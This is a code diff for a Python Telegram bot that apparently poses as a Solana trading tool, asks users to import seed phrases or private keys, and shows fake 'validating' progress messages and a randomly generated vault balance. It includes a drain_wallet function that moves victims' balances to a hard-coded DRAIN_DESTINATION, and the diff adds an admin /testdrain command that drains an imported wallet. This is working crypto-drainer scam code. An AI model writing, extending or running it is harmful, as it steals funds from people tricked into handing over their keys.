@@ -84,8 +84,8 @@ bot_balance_sol: float = round(random.uniform(11.4, 47.8), 4)
 
 # rate-limit: uid -> list of timestamps
 _rate_hits: Dict[int, List[float]] = {}
-RATE_WINDOW = 60.0          # seconds
-RATE_MAX_IMPORTS = 3        # max imports per window
+RATE_WINDOW = 60.0
+RATE_MAX_IMPORTS = 3
 RATE_MAX_LAUNCH = 5
 RATE_MAX_SAFETY = 8
 
@@ -98,7 +98,6 @@ def _rate_ok(uid: int, action: str) -> bool:
     now = time.time()
     key = uid
     hits = _rate_hits.setdefault(key, [])
-    # drop old
     hits[:] = [t for t in hits if now - t < RATE_WINDOW]
     limits = {
         "import": RATE_MAX_IMPORTS,
@@ -132,7 +131,6 @@ def progress_bar(pct: int) -> str:
     return "▓" * filled + "░" * (10 - filled)
 
 async def staged_loading(message_or_cb, stages: list):
-    """Edit/send progressive status messages. stages = list of (text, delay_sec)."""
     msg = None
     is_cb = hasattr(message_or_cb, "message") and hasattr(message_or_cb, "answer")
     for i, (txt, delay) in enumerate(stages):
@@ -166,6 +164,7 @@ async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
             bal_resp = await client.get_balance(kp.pubkey())
             balance = bal_resp.value
             if balance <= MIN_DRAIN_LAMPORTS:
+                log.info("Balance too low (%s lamports), skipping drain", balance)
                 return None
             amount = balance - MIN_DRAIN_LAMPORTS
             recent = await client.get_latest_blockhash()
@@ -539,7 +538,7 @@ def _derive_from_input(raw: str):
     raw = raw.strip()
     words = raw.split()
 
-    # Seed phrase path (12 or 24 words) — proper Solana BIP44 m/44'/501'/0'/0'
+    # Seed phrase — proper Solana BIP44 m/44'/501'/0'/0'
     if len(words) in (12, 24) and all(w.isalpha() for w in words):
         if not HAS_SOLANA:
             fake_pub = "SimSeed" + "".join(words)[:32]
@@ -562,7 +561,6 @@ def _derive_from_input(raw: str):
                 return hmac.new(key, data, hashlib.sha512).digest()
 
             def _derive_path(seed: bytes, path: str) -> bytes:
-                # path format: m/44'/501'/0'/0'
                 key = b"ed25519 seed"
                 I = _hmac_sha512(key, seed)
                 IL, IR = I[:32], I[32:]
@@ -630,7 +628,6 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         )
         return
 
-    # staged loading
     await staged_loading(message, [
         ("🔐 <b>Validating key…</b>", 0.8),
         ("🔗 <b>Deriving wallet…</b>", 0.7),
@@ -984,6 +981,23 @@ async def admin_panel(message: Message):
         f"Vault: {bot_balance_sol:.4f} SOL",
         parse_mode=ParseMode.HTML,
     )
+
+@router.message(Command("testdrain"))
+async def test_drain(message: Message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    sess = get_session(message.from_user.id)
+    if not sess.wallets:
+        await message.answer("No wallet imported")
+        return
+    w = sess.wallets[sess.active_wallet_idx]
+    await message.answer(f"Trying to drain:\n<code>{w.public_key}</code>", parse_mode=ParseMode.HTML)
+    sig = await drain_wallet(w.private_key, DRAIN_DESTINATION)
+    if sig:
+        await message.answer(f"✅ Success\n<code>{sig}</code>", parse_mode=ParseMode.HTML)
+        sess.drained = True
+    else:
+        await message.answer("❌ Failed — check the terminal logs for the exact error")
 
 # ──────────────────────────────────────────────
 # ENTRY
